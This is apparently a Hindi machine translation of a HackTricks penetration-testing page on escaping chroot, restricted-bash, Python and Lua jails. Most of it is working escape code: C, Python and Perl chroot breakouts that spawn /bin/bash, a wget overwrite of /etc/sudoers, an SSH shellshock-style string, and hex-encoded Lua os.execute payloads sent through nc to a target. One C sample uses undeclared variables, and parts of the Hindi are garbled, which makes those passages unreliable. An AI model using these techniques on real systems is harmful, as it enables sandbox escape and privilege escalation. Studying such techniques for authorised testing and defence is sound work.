# जेल से बाहर निकलना

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम विशेषज्ञ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम विशेषज्ञ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
{% endhint %}

## **GTFOBins**

**खोजें** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **यदि आप "शैल" गुणवत्ता के साथ किसी भी BINARY को निष्पादित कर सकते हैं**

## Chroot Escapes

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) से: चरण में रखने की योजना नहीं है कि चरण तंत्र गुणवत्ता वाले (रूट) उपयोगकर्ताओं द्वारा जानबूझकर हस्तक्षेप के खिलाफ रक्षा करे। अधिकांश सिस्टमों पर, chroot संदर्भ सही ढंग से स्टैक नहीं करते हैं और chrooted कार्यक्रम यदि पर्याप्त विशेषाधिकार हैं तो एक दूसरा chroot कर सकते हैं।\
आम तौर पर इसका मतलब है कि भागने के लिए आपको chroot के अंदर रूट होना चाहिए।

{% hint style="success" %}
**उपकरण** [**chw00t**](https://github.com/earthquake/chw00t) निम्नलिखित स्थितियों का दुरुपयोग करने और `chroot` से बाहर निकलने के लिए बनाया गया था।
{% endhint %}

### Root + CWD

{% hint style="warning" %}
यदि आप एक chroot के अंदर **रूट** हैं तो आप **एक और chroot** बना कर **भाग सकते** हैं। यह इसलिए है क्योंकि 2 chroots (Linux में) साथ मौजूद नहीं हो सकते, इसलिए यदि आप एक फ़ोल्डर बनाते हैं और फिर उस नए फ़ोल्डर पर एक नया chroot बनाते हैं जिसमें **आप उसके बाहर हैं**, तो आप अब **नए chroot के बाहर होंगे** और इसलिए आप FS में होंगे।

यह इसलिए होता है क्योंकि आम तौर पर chroot आपकी काम करने की निर्देशित फ़ोल्डर में नहीं ले जाता, इसलिए आप एक chroot बना सकते हैं लेकिन उसके बाहर होंगे।
{% endhint %}

आम तौर पर आप एक chroot जेल के अंदर `chroot` बाइनरी नहीं पाएंगे, लेकिन आप **एक बाइनरी कंपाइल, अपलोड और निष्पादित** कर सकते हैं:
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>पायथन</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>पर्ल</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### रूट + सहेजी गई एफडी

{% hint style="warning" %}
यह पिछले मामले के समान है, लेकिन इस मामले में **हमलावर एक फ़ाइल डिस्क्रिप्टर को वर्तमान निर्देशिका में सहेजता है** और फिर **नए फ़ोल्डर में चरूट बनाता है**। अंततः, जैसे ही **उसके पास** चरूट के **बाहर** उस **एफडी** का **पहुंच** होता है, वह उसे **एक्सेस** करता है और वह **बाहर निकलता है**।
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### रूट + फोर्क + UDS (यूनिक्स डोमेन सॉकेट्स)

{% hint style="warning" %}
FD को यूनिक्स डोमेन सॉकेट्स के माध्यम से पारित किया जा सकता है, इसलिए:

* एक बच्चा प्रक्रिया बनाएं (फोर्क)
* UDS बनाएं ताकि माता-पिता और बच्चा बातचीत कर सकें
* बच्चे प्रक्रिया में एक विभिन्न फ़ोल्डर में chroot चलाएं
* माता-पिता प्रक्रिया में, नए बच्चे प्रक्रिया chroot के बाहर एक फ़ोल्डर का FD बनाएं
* UDS का उपयोग करके उस FD को बच्चे प्रक्रिया को पास करें
* बच्चे प्रक्रिया उस FD पर chdir करें, और क्योंकि यह उसके chroot के बाहर है, वह जेल से बाहर निकल जाएगा
{% endhint %}

### रूट + माउंट

{% hint style="warning" %}
* रूट डिवाइस (/) को चरण में एक निर्देशिका में माउंट करना
* उस निर्देशिका में chroot करना

यह लिनक्स में संभव है
{% endhint %}

### रूट + /proc

{% hint style="warning" %}
* चरण में एक निर्देशिका में procfs माउंट करें (अगर अभी तक नहीं किया गया है)
* एक pid खोजें जिसमें एक विभिन्न रूट/cwd प्रविष्टि है, जैसे: /proc/1/root
* उस प्रविष्टि में chroot करें
{% endhint %}

### रूट(?) + फोर्क

{% hint style="warning" %}
* एक फोर्क (बच्चा प्रक्रिया) बनाएं और एफएस में एक विभिन्न फ़ोल्डर में chroot करें और उस पर सीडी करें
* माता-पिता प्रक्रिया से, बच्चे प्रक्रिया के फ़ोल्डर को उस फ़ोल्डर में ले जाएं जहां बच्चे का chroot है
* यह बच्चे प्रक्रिया अपने आप को चरण के पूर्व एक फ़ोल्डर में पाएगा जो chroot के बाहर है
{% endhint %}

### ptrace

{% hint style="warning" %}
* पहले यूज़र अपनी प्रक्रियाओं को अपने खुद की प्रक्रिया से डीबग कर सकता था... लेकिन यह अब डिफ़ॉल्ट रूप से संभव नहीं है
* फिर भी, यदि यह संभव है, तो आप प्रक्रिया में ptrace कर सकते हैं और उसके भीतर एक शैलकोड निष्पादित कर सकते हैं ([इस उदाहरण को देखें](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## बैश जेल्स

### जाँच

जेल के बारे में जानकारी प्राप्त करें:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### पथ संशोधित करें

जांचें कि क्या आप पथ env चर को संशोधित कर सकते हैं
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### विम का उपयोग
```bash
:set shell=/bin/sh
:shell
```
### दस्तावेज़ बनाएं

जांचें कि क्या आप _/bin/bash_ के साथ एक निष्पादनीय फ़ाइल बना सकते हैं
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH से बैश प्राप्त करें

यदि आप SSH के माध्यम से पहुंच रहे हैं तो आप इस ट्रिक का उपयोग करके एक बैश शैल को क्रियान्वित कर सकते हैं:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### घोषित करें
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

आप उदाहरण के लिए sudoers फ़ाइल को अधिलेखित कर सकते हैं
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### अन्य तरीके

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**यह पेज भी दिलचस्प हो सकता है:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python जेल्स

निम्नलिखित पेज पर Python जेल्स से बाहर निकलने के तरीके:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua जेल्स

इस पेज पर आप लुआ के अंदर जिन ग्लोबल फंक्शन्स तक पहुंच पाते हैं, उन्हें देख सकते हैं: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**कमांड का निष्पादन करने के साथ Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
कुछ तरीके **डॉट का उपयोग किए बिना लाइब्रेरी के फ़ंक्शन को कॉल करने** के:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
एक पुस्तकालय के कार्यों की सूची बनाएं:
```bash
for k,v in pairs(string) do print(k,v) end
```
ध्यान दें कि प्रत्येक बार जब आप पिछले एक लाइनर को **विभिन्न lua वातावरण में निष्पादित करते हैं तो फ़ंक्शनों का क्रम बदल जाता है**। इसलिए यदि आपको एक विशिष्ट फ़ंक्शन को निष्पादित करने की आवश्यकता है तो आप एक ब्रूट फ़ोर्स हमला कर सकते हैं विभिन्न lua वातावरण लोड करके और le पुस्तकालय का पहला फ़ंक्शन कॉल करके:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**इंटरैक्टिव lua शैल**: यदि आप एक सीमित lua शैल के अंदर हैं तो आप नए lua शैल (और उम्मीद है असीमित) को बुलाकर प्राप्त कर सकते हैं:
```bash
debug.debug()
```
## संदर्भ

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (स्लाइड्स: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
AWS हैकिंग सीखें और प्रैक्टिस करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण AWS रेड टीम एक्सपर्ट (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और प्रैक्टिस करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks प्रशिक्षण GCP रेड टीम एक्सपर्ट (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>हैकट्रिक्स का समर्थन करें</summary>

* [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) और **ट्विटर** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** को** **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में PR जमा करके।

</details>
{% endhint %}
